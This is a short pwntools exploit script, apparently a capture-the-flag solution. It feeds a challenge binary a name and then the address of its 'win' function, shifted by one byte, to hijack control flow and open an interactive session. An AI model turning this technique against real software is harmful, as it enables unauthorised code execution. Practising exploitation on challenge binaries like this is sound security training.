#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
exe = './chal'

if args.REMOTE:
    p = remote('localhost', 1337)   
else:
    p = process(exe)



context.terminal = ['tmux', 'splitw', '-h']
l = context.binary = ELF(exe, checksec=False)



p.sendlineafter(b"?\n", b'krish')

val = l.symbols['win'] << 8

p.sendlineafter(b"?\n", str(val).encode())

p.interactive()

